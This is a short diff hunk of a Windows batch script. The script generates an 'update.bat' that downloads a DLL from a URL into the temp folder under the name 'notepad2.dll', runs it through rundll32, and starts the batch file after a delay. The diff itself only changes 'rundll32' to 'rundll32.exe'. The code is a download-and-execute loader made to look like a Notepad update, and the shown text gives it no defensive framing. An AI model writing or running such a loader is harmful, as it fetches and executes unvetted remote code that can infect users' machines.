@@ -17,7 +17,7 @@ set "dllpath=%TEMP%\notepad2.dll"
 (
 echo @echo off
 echo powershell -Command "Invoke-WebRequest -Uri '%dllurl%' -OutFile '%dllpath%'"
-echo rundll32 "%dllpath%",notepad
+echo rundll32.exe "%dllpath%",notepad
 ) > "%updatebat%"
 
 :: Run update.bat after 10-second delay
